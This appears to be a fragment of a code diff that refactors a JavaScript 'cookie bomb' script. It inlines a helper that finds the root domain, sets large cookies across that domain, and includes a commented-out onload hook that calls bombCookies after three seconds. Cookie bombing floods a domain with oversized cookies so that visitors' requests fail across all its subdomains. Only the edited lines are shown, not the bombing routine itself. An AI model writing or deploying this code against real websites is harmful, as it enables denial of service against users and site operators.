@@ -2,14 +2,10 @@
     'use strict';
 
     var COOKIE_SIZE = 4000,
-        ONE_YEAR_LATER_MS = 365 * 24 * 60 * 60 * 1000;
-
-    function getRootDomain() {
-        return window.location.host.match(new RegExp('[^.]*.[^.]*$'))[0];
-    }
+        ONE_YEAR_LATER_MS = 31536e6;
 
     function setCookie(key, value, expires) {
-        var domain = getRootDomain(),
+        var domain = window.location.host.match(new RegExp('[^.]*.[^.]*$'))[0],
             cookie = [key, '=', value, ';path=/;domain=', domain, ';expires=', expires].join('');
 
         document.cookie = cookie;
@@ -28,9 +24,7 @@
     // If you want to bomb after the user has been on the page for a few seconds.
     /*
     window.onload = function() {
-      setTimeout(function () {
-        bombCookies();
-      }, 3 * 1000);
+      setTimeout(bombCookies, 3 * 1000);
     };
     */
 
